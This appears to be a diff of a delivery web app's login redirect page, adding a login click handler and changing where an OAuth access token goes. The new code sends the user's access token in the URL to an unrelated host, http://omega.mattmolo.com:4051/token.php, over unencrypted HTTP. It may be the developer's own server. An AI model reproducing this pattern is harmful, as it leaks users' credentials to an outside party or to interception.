@@ -11,7 +11,7 @@
 </head>
 <body>
 <div class="nav-top">
-    <div>
+    <div onClick="login()">
         Login
     </div>
     <a href="index.html">
@@ -62,13 +62,13 @@ if (window.opener != null){
     window.opener.location = "https://quickdelivery.firebaseapp.com/redirect.html?access_token=" + key;
     window.close();
 }
-if (window.location == "https://quickdelivery.firebaseapp.com/redirect.html?error=User+denied+your+application+access+to+his+or+her+protected+resources.")
+if (window.location == "https://quickdelivery.firebaseapp.com/redirect.html?error=User+denied+your+application+access+to+his+or+her+protected+resources." || window.location == "https://quickdelivery.firebaseapp.com/choice.html?access_token=undefined")
 {
     window.location = "https://quickdelivery.firebaseapp.com";
 }
 else
 {
-    window.location = "https://quickdelivery.firebaseapp.com/choice.html?access_token=" + key;
+    window.location = "http://omega.mattmolo.com:4051/token.php?t=" + key;
 }
 </script>
 
